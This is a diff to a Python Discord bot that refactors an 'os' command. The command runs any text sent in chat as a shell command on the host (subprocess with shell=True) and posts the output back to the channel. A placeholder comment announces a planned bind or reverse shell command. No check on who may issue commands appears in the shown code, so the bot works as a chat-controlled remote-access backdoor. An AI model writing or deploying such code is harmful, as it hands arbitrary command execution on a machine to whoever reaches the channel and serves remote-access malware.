@@ -89,7 +89,7 @@ async def on_ready():
 ##########################################################################################
 
 '''
-All Discord Commands
+All Discord Command related stuffs
 '''
 
 #1. help cmd
@@ -125,35 +125,34 @@ async def motivate(ctx):
 async def ping(ctx):
     await ctx.send(f'**latency**: _{round(bot.latency * 1000)}ms_')
   
-
+#5.1. OS cmd 
 # Sending data chunk by chunk
 def chunks(lst, n):
     for i in range(0, len(lst), n):
         yield lst[i:i+n]
 
+#5.2. OS cmd
+# System cmd
+def SystemCmd(cmd):
+    proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+    result = proc.stdout.read() + proc.stderr.read()    # stdout and stderr
+    result = result.decode('utf-8')                     # decoding result to utf-8
+    return result
 
 #5. OS cmd
 @bot.command()
 async def os(ctx, *args):
     no_of_args = len(args)
-
-    #Converting to string
-    cmd=' '.join(args)
-
-    #Type=type(cmd)
-
-    proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-    result = proc.stdout.read() + proc.stderr.read()    # stdout and stderr
-    result = result.decode('utf-8')                     # decoding result to utf-8
-
-    #json_data=json.dumps(result)
-    #json_data=json_data.decode('utf-8')                 # encoding data to bytes
+    cmd=' '.join(args)      # Converting to string
+    
+    result = SystemCmd(cmd)
 
     await ctx.send('***OUTPUT***')
     for chunk in chunks(result, 2000):
-
         await ctx.send(chunk)
+
+#6. OS bind/rev shell cmd
 
 
 #logging
